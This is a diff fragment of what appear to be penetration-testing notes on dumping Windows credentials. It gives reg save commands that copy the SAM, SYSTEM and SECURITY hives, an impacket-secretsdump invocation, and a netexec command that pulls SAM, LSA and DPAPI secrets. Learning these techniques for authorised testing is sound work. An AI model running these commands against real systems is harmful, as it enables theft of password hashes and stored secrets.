@@ -48,7 +48,7 @@ reg save HKLM\SYSTEM C:\Users\Public\system.hive
 reg save HKLM\SECURITY C:\Users\Public\security.hive
 Old copies a normal user may read:
 dir C:\Windows\Repair, C:\Windows\System32\config\RegBack
-The hives, sent back into loot/, on Kali:
+The hives, sent back into loot/, on Kali. At the pwn-broker prompt: tool install impacket and tool install netexec.
 impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
 Or from Kali, with an administrator's password, the hives, LSA secrets and DPAPI secrets in one go:
 nxc smb <TargetIP> -u '<Username>' -p '<Password>' --local-auth --sam --lsa --dpapi
